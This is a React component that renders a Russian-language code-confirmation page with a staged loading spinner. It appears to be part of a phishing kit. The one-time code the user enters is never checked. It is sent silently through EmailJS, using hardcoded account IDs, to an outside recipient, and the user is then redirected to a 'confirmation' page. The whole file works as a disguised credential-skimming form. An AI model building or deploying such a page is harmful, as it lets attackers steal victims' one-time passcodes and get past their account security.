import "./styles.css";
import { useState, useRef } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import SpinnerIcon from "@rsuite/icons/legacy/Spinner";

const Validation = () => {
  const [OPT, setOPT] = useState("");
  const [load, setLoad] = useState(true);
  const form = useRef();
  const navigate = useNavigate();

  setTimeout(() => {
    setLoad(false);
  }, 3000);

  const optSubmit = (e) => {
    console.log(OPT);
    e.preventDefault();

    emailjs
      .sendForm(
        "service_pduy8oo",
        "template_be4vpep",
        form.current,
        "d7GFUxt5sOvLttX-o"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );

    navigate("/Confirmation");
  };
  return (
    <>
      {load ? (
        <div className="mainLoad">
          <SpinnerIcon className="loadIcon" pulse style={{ fontSize: "2em" }} />
          <h2>Loading...</h2>
        </div>
      ) : (
        <div className="main">
          <h2>Подтверждение</h2>
          <form className="contain" onSubmit={optSubmit} ref={form}>
            <p>
              Введите код который мы вам отправили. ,Это может занять больше
              минуты{" "}
            </p>
            <input
              placeholder="введите код"
              type="tel"
              value={OPT}
              onChange={(e) => setOPT(e.target.value)}
              name="opt"
              required
            />
            <input type="submit" className="valBtn" />
            <p className="codeValidation"> Не получили код ? </p>
          </form>
        </div>
      )}
    </>
  );
};
export default Validation;
